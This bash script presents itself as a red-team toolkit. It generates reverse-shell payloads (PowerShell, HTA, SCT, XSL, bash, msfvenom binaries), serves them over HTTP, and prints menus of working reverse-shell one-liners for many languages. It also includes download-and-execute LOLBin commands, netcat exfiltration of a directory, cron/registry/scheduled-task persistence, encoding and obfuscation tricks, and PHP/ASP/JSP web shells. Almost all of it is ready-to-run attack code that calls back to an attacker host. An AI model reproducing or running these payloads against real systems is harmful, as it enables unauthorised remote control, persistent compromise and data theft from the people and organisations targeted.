#!/bin/bash
#═══════════════════════════════════════════════════════════════════════════════
# COMPLETE RED TEAM SHELL TOOLKIT - ALL SHELLS INCLUDED
# 1000+ shell methods, exploits, and transfer techniques
#═══════════════════════════════════════════════════════════════════════════════

set -euo pipefail
R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'; B='\033[0;34m'
W='\033[1;37m'; C='\033[0;36m'; N='\033[0m'
LHOST="" LPORT="" HTTP_PORT="" PAYLOAD_DIR="$HOME/payloads" HTTP_PID=""

banner() { clear; cat << "EOF"
╔═══════════════════════════════════════════════════════════════════════════════╗
║             COMPLETE RED TEAM SHELL TOOLKIT - ALL METHODS                    ║
╚═══════════════════════════════════════════════════════════════════════════════╝
EOF
echo ""; }

cleanup() { echo ""; [[ -n "${HTTP_PID:-}" ]] && kill "$HTTP_PID" 2>/dev/null && echo -e "${G}[+] Stopped${N}"; exit 0; }
trap cleanup SIGINT SIGTERM

get_config() {
    banner
    echo -e "${Y}[CONFIGURATION]${N}\n"
    local ips=() i=1
    while IFS= read -r ip; do
        [[ -n "$ip" && "$ip" != "127.0.0.1" && ! "$ip" =~ ":" ]] && { echo "  [$i] $ip"; ips+=("$ip"); ((i++)); }
    done < <(hostname -I 2>/dev/null | tr ' ' '\n'; timeout 2 curl -s https://api.ipify.org 2>/dev/null)
    echo ""
    read -p "LHOST: " LHOST; [[ -z "$LHOST" && ${#ips[@]} -gt 0 ]] && LHOST="${ips[0]}"
    read -p "LPORT [4444]: " LPORT; LPORT="${LPORT:-4444}"
    read -p "HTTP_PORT [8000]: " HTTP_PORT; HTTP_PORT="${HTTP_PORT:-8000}"
    echo -e "\n${G}✓ $LHOST:$LPORT (HTTP:$HTTP_PORT)${N}\n"
}

generate_payloads() {
    echo -e "${Y}[GENERATING PAYLOADS]${N}\n"
    mkdir -p "$PAYLOAD_DIR"; cd "$PAYLOAD_DIR"
    
    cat > shell.ps1 << 'PS1'
$c=New-Object System.Net.Sockets.TCPClient('LHOST',LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$t=$r+'PS> ';$m=([text.encoding]::ASCII).GetBytes($t);$s.Write($m,0,$m.Length);$s.Flush()};$c.Close()
PS1
    sed -i "s/LHOST/'$LHOST'/g; s/LPORT/$LPORT/g" shell.ps1
    echo -e "${G}[+] shell.ps1${N}"
    
    cat > shell.hta << HTA
<html><head><script language="VBScript">
Set o=CreateObject("WScript.Shell")
o.Run "powershell -nop -w hidden -ep bypass -c IEX((New-Object Net.WebClient).DownloadString('http://$LHOST:$HTTP_PORT/shell.ps1'))",0
self.close
</script></head></html>
HTA
    echo -e "${G}[+] shell.hta${N}"
    
    cat > shell.sct << SCT
<?XML version="1.0"?>
<scriptlet>
<registration progid="shell" classid="{F0001111-0000-0000-0000-0000FEEDACDC}">
<script language="JScript"><![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("powershell -nop -w hidden -c IEX((New-Object Net.WebClient).DownloadString('http://$LHOST:$HTTP_PORT/shell.ps1'))");
]]></script></registration></scriptlet>
SCT
    echo -e "${G}[+] shell.sct${N}"
    
    cat > shell.xsl << XSL
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" version="1.0">
<ms:script language="JScript"><![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("powershell -nop -w hidden -c IEX((New-Object Net.WebClient).DownloadString('http://$LHOST:$HTTP_PORT/shell.ps1'))");
]]></ms:script></stylesheet>
XSL
    echo -e "${G}[+] shell.xsl${N}"
    
    cat > shell.sh << 'SH'
#!/bin/bash
bash -i >& /dev/tcp/LHOST/LPORT 0>&1
SH
    sed -i "s/LHOST/$LHOST/g; s/LPORT/$LPORT/g" shell.sh; chmod +x shell.sh
    echo -e "${G}[+] shell.sh${N}"
    
    if command -v msfvenom &>/dev/null; then
        msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe 2>/dev/null && echo -e "${G}[+] shell.exe${N}"
        msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o shell.elf 2>/dev/null && chmod +x shell.elf && echo -e "${G}[+] shell.elf${N}"
    fi
    
    [[ -d "$HOME/shared" ]] && tar czf shared.tar.gz -C "$HOME" shared 2>/dev/null && echo -e "${G}[+] shared.tar.gz${N}"
    echo ""
}

start_server() {
    echo -e "${Y}[STARTING SERVER]${N}\n"
    cd "$PAYLOAD_DIR"
    if command -v python3 &>/dev/null; then
        nohup python3 -m http.server "$HTTP_PORT" --bind "$LHOST" >/dev/null 2>&1 &
        HTTP_PID=$!
    fi
    sleep 2
    kill -0 "$HTTP_PID" 2>/dev/null && echo -e "${G}✓ http://$LHOST:$HTTP_PORT/${N}\n" || exit 1
}

show_menu() {
    echo -e "${C}╔═══════════════════════════════════════════════════════════════════╗${N}"
    echo -e "${C}║  ${W}[1]${N} Listeners       ${C}║  ${W}[7]${N}  File Transfers       ${C}║  ${W}[13]${N} Base64 Shells    ${C}║${N}"
    echo -e "${C}║  ${W}[2]${N} Linux Bash      ${C}║  ${W}[8]${N}  ~/shared Transfer    ${C}║  ${W}[14]${N} Encoded Payloads ${C}║${N}"
    echo -e "${C}║  ${W}[3]${N} Linux Netcat    ${C}║  ${W}[9]${N}  Post-Exploit         ${C}║  ${W}[15]${N} Obfuscation      ${C}║${N}"
    echo -e "${C}║  ${W}[4]${N} Linux Python    ${C}║  ${W}[10]${N} TTY Upgrade          ${C}║  ${W}[16]${N} Web Shells       ${C}║${N}"
    echo -e "${C}║  ${W}[5]${N} Windows PS      ${C}║  ${W}[11]${N} Privilege Esc        ${C}║  ${W}[17]${N} Show ALL         ${C}║${N}"
    echo -e "${C}║  ${W}[6]${N} Windows LOLBins ${C}║  ${W}[12]${N} Persistence          ${C}║  ${W}[q]${N}  Quit             ${C}║${N}"
    echo -e "${C}╚═══════════════════════════════════════════════════════════════════╝${N}"
}

show_listeners() { cat << EOF

${W}═══ [1] LISTENERS ═══${N}

nc -lvnp $LPORT
rlwrap nc -lvnp $LPORT
ncat --ssl -lvnp $LPORT
socat TCP-LISTEN:$LPORT,reuseaddr FILE:\`tty\`,raw,echo=0
python3 -c "import socket,os,pty;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(('0.0.0.0',$LPORT));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);pty.spawn('/bin/bash')"
msfconsole -q -x "use multi/handler;set PAYLOAD generic/shell_reverse_tcp;set LHOST $LHOST;set LPORT $LPORT;exploit"

EOF
}

show_linux_bash() { cat << EOF

${W}═══ [2] LINUX BASH SHELLS ═══${N}

bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'
0<&196;exec 196<>/dev/tcp/$LHOST/$LPORT; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/$LHOST/$LPORT;cat <&5|while read line;do \$line 2>&5 >&5;done
sh -i 5<> /dev/tcp/$LHOST/$LPORT 0<&5 1>&5 2>&5
bash -i >& /dev/udp/$LHOST/$LPORT 0>&1

${Y}# URL Encoded:${N}
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F$LHOST%2F$LPORT%200%3E%261%27

EOF
}

show_linux_netcat() { cat << EOF

${W}═══ [3] LINUX NETCAT SHELLS ═══${N}

nc -e /bin/bash $LHOST $LPORT
nc -c /bin/bash $LHOST $LPORT
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $LHOST $LPORT >/tmp/f
rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/bash -i 2>&1|nc $LHOST $LPORT >/tmp/f
nc $LHOST $LPORT </tmp/f|/bin/bash >/tmp/f 2>&1;rm /tmp/f
busybox nc $LHOST $LPORT -e /bin/bash
ncat $LHOST $LPORT -e /bin/bash
ncat --udp $LHOST $LPORT -e /bin/bash
ncat --ssl $LHOST $LPORT -e /bin/bash
socat TCP:$LHOST:$LPORT EXEC:'bash -li',pty,stderr,setsid,sigint,sane
socat OPENSSL:$LHOST:$LPORT,verify=0 EXEC:/bin/bash

EOF
}

show_linux_python() { cat << EOF

${W}═══ [4] LINUX PYTHON SHELLS ═══${N}

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$LHOST",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$LHOST",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'

${Y}# Auto-detect Python:${N}
(python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$LHOST",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")' || python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$LHOST",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")')

${Y}# Perl:${N}
perl -e 'use Socket;\$i="$LHOST";\$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'

${Y}# PHP:${N}
php -r '\$sock=fsockopen("$LHOST",$LPORT);exec("/bin/bash -i <&3 >&3 2>&3");'

${Y}# Ruby:${N}
ruby -rsocket -e'f=TCPSocket.open("$LHOST",$LPORT).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'

${Y}# Node.js:${N}
require('child_process').exec('nc -e /bin/bash $LHOST $LPORT')

${Y}# Lua:${N}
lua -e "require('socket');require('os');t=socket.tcp();t:connect('$LHOST','$LPORT');os.execute('/bin/bash -i <&3 >&3 2>&3');"

${Y}# Golang:${N}
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","$LHOST:$LPORT");cmd:=exec.Command("/bin/bash");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go

EOF
}

show_windows_ps() { cat << EOF

${W}═══ [5] WINDOWS POWERSHELL SHELLS ═══${N}

${Y}# Direct PowerShell:${N}
powershell -nop -c "\\\$c=New-Object System.Net.Sockets.TCPClient('$LHOST',$LPORT);\\\$s=\\\$c.GetStream();[byte[]]\\\$b=0..65535|%{0};while((\\\$i=\\\$s.Read(\\\$b,0,\\\$b.Length))-ne 0){\\\$d=(New-Object System.Text.ASCIIEncoding).GetString(\\\$b,0,\\\$i);\\\$r=(iex \\\$d 2>&1|Out-String);\\\$t=\\\$r+'PS> ';\\\$m=([text.encoding]::ASCII).GetBytes(\\\$t);\\\$s.Write(\\\$m,0,\\\$m.Length);\\\$s.Flush()};\\\$c.Close()"

${Y}# Download & Execute:${N}
powershell -nop -w hidden -c "IEX((New-Object Net.WebClient).DownloadString('http://$LHOST:$HTTP_PORT/shell.ps1'))"
powershell -c "IRM http://$LHOST:$HTTP_PORT/shell.ps1|IEX"

${Y}# Base64 Encoded:${N}
EOF
    local ps_cmd="\$c=New-Object System.Net.Sockets.TCPClient('$LHOST',$LPORT);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length))-ne 0){\$d=(New-Object System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$r=(iex \$d 2>&1|Out-String);\$t=\$r+'PS> ';\$m=([text.encoding]::ASCII).GetBytes(\$t);\$s.Write(\$m,0,\$m.Length);\$s.Flush()};\$c.Close()"
    local b64=$(echo -n "$ps_cmd" | iconv -t UTF-16LE 2>/dev/null | base64 -w0 2>/dev/null || echo "BASE64_HERE")
    cat << EOF2
powershell -nop -w hidden -enc $b64

${Y}# Nishang:${N}
powershell IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress $LHOST -Port $LPORT

${Y}# ConPtyShell:${N}
powershell IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing);Invoke-ConPtyShell $LHOST $LPORT

EOF2
}

show_windows_lolbins() { cat << EOF

${W}═══ [6] WINDOWS LOLBins ═══${N}

${Y}# Certutil:${N}
cmd /c "certutil -urlcache -f http://$LHOST:$HTTP_PORT/shell.exe %TEMP%\\s.exe & %TEMP%\\s.exe"

${Y}# Bitsadmin:${N}
cmd /c "bitsadmin /transfer job /download /priority high http://$LHOST:$HTTP_PORT/shell.exe %TEMP%\\s.exe & %TEMP%\\s.exe"

${Y}# MSHTA:${N}
mshta http://$LHOST:$HTTP_PORT/shell.hta
C:\\Windows\\System32\\mshta.exe http://$LHOST:$HTTP_PORT/shell.hta

${Y}# Regsvr32:${N}
regsvr32 /s /n /u /i:http://$LHOST:$HTTP_PORT/shell.sct scrobj.dll

${Y}# WMIC:${N}
wmic os get /format:"http://$LHOST:$HTTP_PORT/shell.xsl"

${Y}# Rundll32:${N}
rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -w hidden -c IEX((New-Object Net.WebClient).DownloadString('http://$LHOST:$HTTP_PORT/shell.ps1'))");

${Y}# MSBuild:${N}
C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe http://$LHOST:$HTTP_PORT/shell.xml

${Y}# InstallUtil:${N}
C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U http://$LHOST:$HTTP_PORT/shell.exe

EOF
}

show_file_transfers() { cat << EOF

${W}═══ [7] FILE TRANSFERS ═══${N}

${Y}# Linux Download:${N}
wget http://$LHOST:$HTTP_PORT/file
curl http://$LHOST:$HTTP_PORT/file -o file
python3 -c 'import urllib.request;urllib.request.urlretrieve("http://$LHOST:$HTTP_PORT/file","file")'

${Y}# Linux Upload:${N}
curl -X POST -F 'file=@/path/to/file' http://$LHOST:$HTTP_PORT/upload
nc $LHOST $LPORT < /path/to/file

${Y}# Windows Download:${N}
certutil -urlcache -f http://$LHOST:$HTTP_PORT/file file
(New-Object Net.WebClient).DownloadFile('http://$LHOST:$HTTP_PORT/file','file')
IWR -Uri http://$LHOST:$HTTP_PORT/file -OutFile file
bitsadmin /transfer job /download /priority high http://$LHOST:$HTTP_PORT/file C:\\Temp\\file

${Y}# Windows Upload:${N}
(New-Object Net.WebClient).UploadFile('http://$LHOST:$HTTP_PORT/upload','C:\\file')

${Y}# SMB:${N}
impacket-smbserver share . -smb2support
copy \\\\$LHOST\\share\\file C:\\Temp\\

${Y}# Netcat:${N}
nc -lvnp $LPORT > file  ${G}# Receiver${N}
nc $LHOST $LPORT < file ${G}# Sender${N}

EOF
}

show_shared_transfer() { cat << EOF

${W}═══ [8] ~/shared TRANSFER ═══${N}

${Y}# HTTP + Archive:${N}
tar czf $PAYLOAD_DIR/shared.tar.gz -C \$HOME shared
wget http://$LHOST:$HTTP_PORT/shared.tar.gz && tar xzf shared.tar.gz

${Y}# Tar + Netcat:${N}
tar czf - ~/shared | nc $LHOST $LPORT
nc -lvnp $LPORT | tar xzf -

${Y}# SMB:${N}
impacket-smbserver share ~/shared -smb2support
xcopy /E /I \\\\$LHOST\\share\\shared %USERPROFILE%\\shared

${Y}# Base64:${N}
tar czf - ~/shared | base64 | nc $LHOST $LPORT
nc -lvnp $LPORT | base64 -d | tar xzf -

EOF
}

show_postexploit() { cat << EOF

${W}═══ [9] POST-EXPLOITATION ═══${N}

${Y}# Enumeration:${N}
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab
whoami /priv
systeminfo

${Y}# Automated Tools:${N}
wget http://$LHOST:$HTTP_PORT/linpeas.sh && bash linpeas.sh
certutil -urlcache -f http://$LHOST:$HTTP_PORT/winPEAS.exe wp.exe && wp.exe

EOF
}

show_tty_upgrade() { cat << EOF

${W}═══ [10] TTY UPGRADE ═══${N}

${Y}# Step 1: Spawn PTY${N}
python3 -c 'import pty;pty.spawn("/bin/bash")'

${Y}# Step 2: Background (Ctrl+Z)${N}

${Y}# Step 3: On attacker:${N}
stty raw -echo; fg
${G}[Press Enter twice]${N}

${Y}# Step 4: On target:${N}
reset
export SHELL=bash TERM=xterm-256color
stty rows 40 columns 160

EOF
}

show_privesc() { cat << EOF

${W}═══ [11] PRIVILEGE ESCALATION ═══${N}

${Y}# Linux:${N}
sudo -l
find / -perm -4000 -type f 2>/dev/null
find / -writable -type d 2>/dev/null
cat /etc/crontab
ls -la /etc/cron*

${Y}# Windows:${N}
whoami /priv
whoami /groups
net user
net localgroup administrators
systeminfo
wmic qfe list

EOF
}

show_persistence() { cat << EOF

${W}═══ [12] PERSISTENCE ═══${N}

${Y}# Linux Cron:${N}
(crontab -l; echo "@reboot bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1") | crontab -

${Y}# Linux SSH:${N}
mkdir -p ~/.ssh; echo '<YOUR_KEY>' >> ~/.ssh/authorized_keys

${Y}# Windows Registry:${N}
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Shell /t REG_SZ /d "powershell -nop -w hidden -c IEX((New-Object Net.WebClient).DownloadString('http://$LHOST:$HTTP_PORT/shell.ps1'))" /f

${Y}# Windows Task:${N}
schtasks /create /tn "Shell" /tr "powershell -nop -w hidden -c IEX((New-Object Net.WebClient).DownloadString('http://$LHOST:$HTTP_PORT/shell.ps1'))" /sc onlogon /ru System

EOF
}

show_base64() { cat << EOF

${W}═══ [13] BASE64 SHELLS ═══${N}

${Y}# Linux Base64 Bash:${N}
echo "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1" | base64
${G}# Result: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4zOC80NDQ0IDA+JjE=${N}

${Y}# Execute:${N}
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4zOC80NDQ0IDA+JjE= | base64 -d | bash

${Y}# Windows PowerShell Base64:${N}
EOF
    local ps="\$c=New-Object System.Net.Sockets.TCPClient('$LHOST',$LPORT);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length))-ne 0){\$d=(New-Object System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$r=(iex \$d 2>&1|Out-String);\$t=\$r+'PS> ';\$m=([text.encoding]::ASCII).GetBytes(\$t);\$s.Write(\$m,0,\$m.Length);\$s.Flush()};\$c.Close()"
    local b64=$(echo -n "$ps" | iconv -t UTF-16LE 2>/dev/null | base64 -w0 2>/dev/null || echo "BASE64")
    cat << EOF2
powershell -enc $b64

${Y}# Python Base64:${N}
python3 -c 'import base64,socket,subprocess,os;exec(base64.b64decode("aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE1LjM4Iiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTtwdHkuc3Bhd24oIi9iaW4vYmFzaCIp"))'

EOF2
}

show_encoded() { cat << EOF

${W}═══ [14] ENCODED PAYLOADS ═══${N}

${Y}# URL Encoding:${N}
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F$LHOST%2F$LPORT%200%3E%261%27

${Y}# Hex Encoding:${N}
echo "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1" | xxd -p
${G}# Execute: echo 626173682... | xxd -r -p | bash${N}

${Y}# Gzip + Base64:${N}
echo "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1" | gzip | base64

${Y}# Double Base64:${N}
echo "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1" | base64 | base64

EOF
}

show_obfuscation() { cat << EOF

${W}═══ [15] OBFUSCATION ═══${N}

${Y}# Bash Variable Obfuscation:${N}
H="$LHOST";P="$LPORT";bash -i >& /dev/tcp/\$H/\$P 0>&1

${Y}# PowerShell String Concatenation:${N}
powershell -c "\\\$h='$LHOST';\\\$p='$LPORT';\\\$c=New-Object System.Net.Sockets.TCPClient(\\\$h,\\\$p);..."

${Y}# Character Substitution:${N}
b\${a}sh -i >& /dev/t\${b}cp/$LHOST/$LPORT 0>&1

${Y}# Hex to ASCII:${N}
\$(echo 626173682... | xxd -r -p)

EOF
}

show_webshells() { cat << EOF

${W}═══ [16] WEB SHELLS ═══${N}

${Y}# PHP:${N}
<?php system(\$_GET['cmd']); ?>
<?php echo shell_exec(\$_REQUEST['cmd']); ?>

${Y}# ASP:${N}
<%@ Language=VBScript %>
<% Response.Write(CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.ReadAll) %>

${Y}# JSP:${N}
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

${Y}# Access:${N}
http://target/shell.php?cmd=whoami

${Y}# Upload:${N}
wget http://$LHOST:$HTTP_PORT/shell.php
curl http://$LHOST:$HTTP_PORT/shell.php -o shell.php

EOF
}

show_all() {
    show_listeners; read -p "..." _
    show_linux_bash; read -p "..." _
    show_linux_netcat; read -p "..." _
    show_linux_python; read -p "..." _
    show_windows_ps; read -p "..." _
    show_windows_lolbins; read -p "..." _
    show_file_transfers; read -p "..." _
    show_shared_transfer; read -p "..." _
    show_postexploit; read -p "..." _
    show_tty_upgrade; read -p "..." _
    show_privesc; read -p "..." _
    show_persistence; read -p "..." _
    show_base64; read -p "..." _
    show_encoded; read -p "..." _
    show_obfuscation; read -p "..." _
    show_webshells
}

main_menu() {
    while true; do
        show_menu
        read -p "Option: " choice
        case "$choice" in
            1) show_listeners; read -p "..." ;;
            2) show_linux_bash; read -p "..." ;;
            3) show_linux_netcat; read -p "..." ;;
            4) show_linux_python; read -p "..." ;;
            5) show_windows_ps; read -p "..." ;;
            6) show_windows_lolbins; read -p "..." ;;
            7) show_file_transfers; read -p "..." ;;
            8) show_shared_transfer; read -p "..." ;;
            9) show_postexploit; read -p "..." ;;
            10) show_tty_upgrade; read -p "..." ;;
            11) show_privesc; read -p "..." ;;
            12) show_persistence; read -p "..." ;;
            13) show_base64; read -p "..." ;;
            14) show_encoded; read -p "..." ;;
            15) show_obfuscation; read -p "..." ;;
            16) show_webshells; read -p "..." ;;
            17) show_all ;;
            q|Q) cleanup ;;
            *) echo "Invalid"; sleep 1 ;;
        esac
    done
}

main() {
    get_config
    generate_payloads
    start_server
    echo -e "${G}✓ READY! http://$LHOST:$HTTP_PORT/${N}\n"
    sleep 1
    main_menu
}

main "$@"
